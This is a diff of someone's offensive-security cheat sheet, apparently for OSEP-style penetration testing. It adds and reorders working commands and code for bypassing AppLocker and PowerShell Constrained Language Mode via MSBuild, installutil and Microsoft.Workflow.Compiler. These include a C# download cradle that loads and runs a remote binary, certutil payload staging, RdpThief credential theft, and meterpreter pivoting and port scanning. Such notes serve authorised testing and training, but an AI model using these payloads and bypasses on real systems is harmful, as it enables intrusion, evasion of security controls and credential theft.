@@ -159,13 +159,6 @@ PS C:\Windows\Tasks> [rev.Program]::Main("".Split())
 # alternative: without arguments
 PS C:\Windows\Tasks> [rev.Program]::Main()
 ```
-## msbuild
-https://github.com/bohops/GhostBuild/blob/master/GhostBuilder.py
-```
-python3 GhostBuilder.py -e path/to/bad.exe -o bad.xml
-# upload to victim
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
-```
 
 # reflective injecting dll
 `reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
@@ -432,7 +425,7 @@ type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.
 # exploitation
 wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 ```
-## CLM bypass: powershell runspace via installutil
+## powershell runspace via installutil (clm bypass)
 use this if you come across this error in powershell:
 `Cannot invoke method. Method invocation is supported only on core types in this language mode.`
 - copy `System.Management.Automation.dll` to csharp project folder and edit `applocker_bypass_powershell_runspace.csproj`
@@ -462,6 +455,11 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 ```
 alternative: https://github.com/padovah4ck/PSByPassCLM
+### meterpreter clm bypass
+```
+load powershell 
+powershell_shell
+```
 ## bypass for reflective injecting dll
 resource needed: `reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
 `applocker_bypass_powershell_runspace\Program.cs`
@@ -471,9 +469,9 @@ String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://19
 perform same exploit as `powershell runspace via installutil`
 
 ## Microsoft.Workflow.Compiler.exe
+bypass applocker for C# executable
+modify `OSEP-Code-Snippets/applocker_bypass_workflow_compiler/applocker_bypass_workflow_compiler.ps1`
 ```
-# modify applocker_bypass_workflow_compiler.ps1 on the win dev box
-
 ...
 $output = "<PATH>\run.xml"
 ...
@@ -481,12 +479,41 @@ $Acl = Get-ACL $output;$AccessRule= New-Object
 System.Security.AccessControl.FileSystemAccessRule("<USER>","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
 ...
 ```
-
-> ENSURE: the executable you want to load into memory (e.g. SharpUp.exe) is in the same folder as file1.txt and file2.txt
-
+use C# download cradle and reflection
+modify `OSEP-Code-Snippets/applocker_bypass_workflow_compiler/test.txt`
+see `OSEP-Code-Snippets/applocker_bypass_workflow_compiler/sharpup.txt` as an example
 ```
-# encode payloads applocker_bypass_workflow_compiler.ps1  test.txt
-# test.txt is your csharp payload
+using System;
+using System.Workflow.ComponentModel;
+public class Run : Activity{
+    public Run() {
+        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("http://192.168.49.102/<BINARY>.exe")).GetType("<NAMESPACE>.<CLASS_NAME>").GetMethod("Main").Invoke(0, new object[] { });
+    }
+}
+```
+transfer modified applocker_bypass_workflow_compiler.ps1 and test.txt onto target
+```
+# applocker_bypass_workflow_compiler.ps1 will generate run.xml
+powershell -ep bypass .\applocker_bypass_workflow_compiler.ps1
+
+# use lobas to compile and execute test.txt (with run.xml)
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
+
+# use result.xml to troubleshoot compilation errors
+```
+### troubleshooting
+```
+- make sure the method you are invoking is public
+- if there are arguments eg 'audit' for the Main method you are calling:
+Invoke(0, new object[] { new string[] { "audit" } });
+- if there are NO arguments for the Main method you are calling:
+Invoke(0, new object[] { });
+```
+### example (transfer via certutil)
+> ENSURE: the executable you want to load into memory (e.g. SharpUp.exe) is in the same folder as file1.txt and file2.txt
+```
+# encode payloads applocker_bypass_workflow_compiler.ps1 test.txt
+# Program.cs = file2.txt = test.txt 
 echo "-----BEGIN CERTIFICATE-----" > file1.txt; cat applocker_bypass_workflow_compiler.ps1 | base64 >> file1.txt; echo "-----END CERTIFICATE-----" >> file1.txt; echo "-----BEGIN CERTIFICATE-----" > file2.txt; cat test.txt | base64 >> file2.txt; echo "-----END CERTIFICATE-----" >> file2.txt; python3 -m http.server 80
 ```
 
@@ -500,12 +527,12 @@ certutil -urlcache -split -f "http://192.168.49.102/file1.txt" && certutil -deco
 powershell -ep bypass .\applocker_bypass_workflow_compiler.ps1
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
-
-### troubleshooting
+## msbuild
+https://github.com/bohops/GhostBuild/blob/master/GhostBuilder.py
 ```
-- make sure the method you are invoking is public
-- if there are arguments eg 'audit' for the Main method you are calling:
-Invoke(0, new object[] { new string[] { "audit" } });
+python3 GhostBuilder.py -e path/to/bad.exe -o bad.xml
+# upload to victim
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
 ## mshta.exe
 `OSEP-Code-Snippets/applocker_bypass_jscript/test.hta`
@@ -1044,6 +1071,7 @@ meterpreter > background
 msf6 exploit(multi/handler) > use multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > set session 1
 msf6 post(multi/manage/autoroute) > exploit
+msf6 post(multi/manage/autoroute) > route print
 ...
 msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
@@ -1093,9 +1121,8 @@ C:\Windows\Tasks>sharprdp.exe computername=appsrv01 command="powershell (New-Obj
 ```
 
 ## steal rdp creds with rdpthief
-
+`OSEP-Code-Snippets\rdpthief_mstsc_injector`
 ```
-# compile \vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector
 C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector\bin\x64\Release\rdpthief_mstsc_injector.exe .
 C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector\RdpThief.dll .
 C:\Windows\Tasks>rdpthief_mstsc_injector.exe
@@ -1629,7 +1656,6 @@ setspn -a prod.corp1.com/TestService3.prod.corp1.com:1337 prod.corp1.com\TestSer
 
 # then perform kerberoast with Invoke-Kerberoast.ps1
 ```
-
 ## kerberos unconstrained delegation
 ### enumeration
 we want to look for `TRUSTED_FOR_DELEGATION` any machine with this will be the target
@@ -2220,6 +2246,18 @@ $psi.RedirectStandardOutput = $false
 $process = [System.Diagnostics.Process]::Start($psi)
 ```
 
+# meterpreter stuff (add to navi)
+```
+# add routes for pivoting
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+msf6 post(multi/manage/autoroute) > exploit
+msf6 post(multi/manage/autoroute) > route print
+
+# port scan via pivot
+msf6 post(multi/manage/autoroute) > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOST 172.16.234.151
+```
 # github tokens
 
 ```
